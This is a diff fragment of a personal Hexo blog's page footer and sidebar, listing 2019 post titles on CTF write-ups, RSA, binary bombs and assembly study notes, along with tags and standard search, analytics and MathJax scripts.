+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2019/04/23/2019.04.23（45）/">二进制炸弹：Phase_5解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href="/2019/04/22/2019.04.22（44）/">sscanf()函数的详细总结 + 实例</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href="/2019/04/21/2019.04.21（43）/">二进制炸弹：Phase_4解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/2019/04/20/2019.04.20（42）/">二进制炸弹：Phase_3解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019.04.19（41）/">二进制炸弹：Phase_2解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/2019/04/18/2019.04.18（40）/">二进制炸弹：Phase_1解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href="/2019/04/17/2019.04.17（39）/">二进制炸弹解题知识储备</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href="/2019/04/16/2019.04.16（38）/">《汇编语言程序设计》学习笔记（十）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href="/2019/04/15/2019.04.15（37）/">reverse：Reverse sign in解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2019/04/14/2019.04.14（36）/">《汇编语言程序设计》学习笔记（九）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href="/2019/04/13/2019.04.13（35）/">Crypto：RSA详细总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href="/2019/04/12/2019.04.12（34）/">《汇编语言程序设计》学习笔记（八）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href="/2019/04/10/2019.04.10（33）/">Crypto：RSA2解题总结（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href="/2019/04/09/2019.04.09（32）/">Crypto：RSA2解题总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href="/2019/04/08/2019.04.08（31）/">openssl学习笔记（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/2019.04.07（30）/">openssl学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/05</span><a class="archive-post-title" href="/2019/04/05/2019.04.05（29）/">Crypto：What's RSA？解题总结（2）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/2019.04.04（28）/">《汇编语言程序设计》学习笔记（七）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href="/2019/04/03/2019.04.03（27）/">《汇编语言程序设计》学习笔记（六）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2019.04.02（26）/">《汇编语言程序设计》学习笔记（五）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href="/2019/04/01/2019.04.01（25）/">《汇编语言程序设计》学习笔记（四）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span><a class="archive-post-title" href="/2019/03/19/2019.03.19（24）/">复试进度总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href="/2019/03/18/2019.03.18（23）/">复试复习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href="/2019/03/17/2019.03.17（22）/">《保密概论》总知识点提纲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href="/2019/03/16/2019.03.16（21）/">《保密概论》第6、7章知识点提纲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2019/03/14/2019.03.14（20）/">《保密概论》前五章知识点提纲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/2019.03.13（19）/">《汇编语言程序设计》学习笔记（三）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href="/2019/03/12/2019.03.12（18）/">《汇编语言程序设计》学习笔记（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2019/03/11/2019.03.11（17）/">《汇编语言程序设计》学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href="/2019/03/10/2019.03.10（16）/">Binary Bombs——汇编语言学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href="/2019/03/09/2019.03.09（15）/">正则表达式总结（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2019/03/08/2019.03.08（14）/">Web：Calculator解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href="/2019/03/07/2019.03.07（13）/">Misc：Invisible flag解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href="/2019/03/06/2019.03.06（12）/">学习总结（1）：隐写术</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/2019.03.05（11）/">Misc：Forensics2解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2019/03/04/2019.03.04（10）/">Misc：PkCrack解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href="/2019/03/03/2019.03.03（9）/">Misc：shell解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/2019.03.02（8）/">Misc：Exif 解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019.03.01（7）/">Misc：Forensics1 解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href="/2019/02/28/2019.02.28（6）/">Crypto：What's RSA？解题总结（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href="/2019/02/27/2019.02.27（5）/">Misc:LSB解题总结+学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/2019.02.26（4）/">Misc:docx解题过程+学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/2019.02.25（3）/">创建Github+Hexo个人博客总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019.02.24（2）/">Misc:Signin/Misc:Poem/Misc:Birthday解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2019/02/23/2019.02.23（1）/">《So you want to work in security》”读后感</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="解题总结"><span class="iconfont-archer">&#xe606;</span>解题总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
+    
+        <span class="sidebar-tag-name" data-tags="汇编语言"><span class="iconfont-archer">&#xe606;</span>汇编语言</span>
+    
+        <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
+    
+        <span class="sidebar-tag-name" data-tags="《保密概论》"><span class="iconfont-archer">&#xe606;</span>《保密概论》</span>
+    
+        <span class="sidebar-tag-name" data-tags="kali"><span class="iconfont-archer">&#xe606;</span>kali</span>
+    
+        <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
+    
+        <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="《图解密码技术》学习笔记"><span class="iconfont-archer">&#xe606;</span>《图解密码技术》学习笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="Virtual machine"><span class="iconfont-archer">&#xe606;</span>Virtual machine</span>
+    
+        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
+    
+        <span class="sidebar-tag-name" data-tags="《软件安全分析与应用》"><span class="iconfont-archer">&#xe606;</span>《软件安全分析与应用》</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwnable.kr"><span class="iconfont-archer">&#xe606;</span>pwnable.kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约漏洞"><span class="iconfont-archer">&#xe606;</span>智能合约漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="知识库"><span class="iconfont-archer">&#xe606;</span>知识库</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux"><span class="iconfont-archer">&#xe606;</span>Linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="GDB"><span class="iconfont-archer">&#xe606;</span>GDB</span>
+    
+        <span class="sidebar-tag-name" data-tags="Tools"><span class="iconfont-archer">&#xe606;</span>Tools</span>
+    
+        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
+    
+        <span class="sidebar-tag-name" data-tags="内核"><span class="iconfont-archer">&#xe606;</span>内核</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="JavaScript"><span class="iconfont-archer">&#xe606;</span>JavaScript</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Binary"><span class="iconfont-archer">&#xe60a;</span>Binary</span>
+    
+        <span class="sidebar-category-name" data-categories="Tools"><span class="iconfont-archer">&#xe60a;</span>Tools</span>
+    
+        <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "MUZIBing"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
+
+
